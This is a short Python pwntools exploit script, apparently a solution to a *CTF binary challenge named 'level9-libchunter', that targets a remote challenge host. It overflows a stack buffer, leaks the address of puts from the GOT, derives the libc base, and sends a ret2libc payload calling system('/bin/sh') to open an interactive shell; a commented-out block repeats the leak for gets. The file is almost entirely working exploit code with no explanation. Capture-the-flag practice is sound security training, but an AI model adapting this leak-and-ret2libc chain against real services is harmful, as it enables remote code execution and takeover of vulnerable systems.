#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2018 vam <jpwan21@gmail.com>
#
# Distributed under terms of the MIT license.

"""
to solve *ctf find libc
"""

from pwn import *

r = remote("10.132.141.60",22009)
#r = process("./level9-libchunter")

elf = ELF("./level9-libchunter")
libc = ELF("./libc6-i386_2.23-0ubuntu10_amd64.so")


word= r.recv()
print word

prepayload = 'a'*0x28 + 'a'*4 + p32(elf.plt['puts']) + p32(0x080484CB) + p32(elf.got['puts']) 
r.sendline(prepayload)

word1 = r.recv()
print len(word1)
word1 = word1[:4]
word1 = word1[::-1]
word1  = word1.encode('hex')
word1 = int(word1, 16)
print 'the addr of puts'
print hex(word1)
'''
prepayload2 = 'a'*0x28 + 'a'*4 + p32(elf.plt['puts']) + p32(0x80484CB) + p32(elf.got['gets'])
r.sendline(prepayload2)
word2= r.recv()
print len(word2)
word2 = word2[:4]
word2 = word2[::-1]
word2 = word2.encode('hex')
word2 = int(word2, 16)
print 'the addr of gets'
print hex(word2)
'''

libc.address = word1 - libc.sym['puts']
print "base_addr is: "+hex(libc.address)

exeve_actu = libc.sym['system']
sh_actu = list(libc.search("/bin/sh"))[0]

print "exeve_actu is: "+ hex(exeve_actu)
print "sh_actu is: " + hex(sh_actu)

payload = 'a'*0x28 +'a'*4 + p32(exeve_actu) + p32(9) + p32(sh_actu) # p32(elf.plt['__gmon_start__']) + p32(exeve_addr) + p32(0)+ p32(sh_addr)

r.sendline(payload)
r.interactive()